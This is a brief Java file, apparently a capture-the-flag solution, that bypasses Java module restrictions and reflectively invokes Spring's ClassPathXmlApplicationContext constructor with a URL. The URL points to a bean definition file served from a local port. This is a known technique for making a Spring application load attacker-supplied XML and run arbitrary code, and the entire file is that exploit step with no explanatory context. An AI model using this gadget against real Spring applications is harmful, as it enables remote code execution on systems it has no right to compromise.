package solution;

import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.lang.reflect.Constructor;

public class ClassPathXml {
    public static void main(String[] args) throws Exception {
        Tools17.bypassModule(ClassPathXml.class);
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext();
        Class<?> aClass = Class.forName(context.getClass().getName(), false, context.getClassLoader());
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(String.class);
        declaredConstructor.setAccessible(true);
        declaredConstructor.newInstance("http://127.0.0.1:9990/1.xml");

    }
}
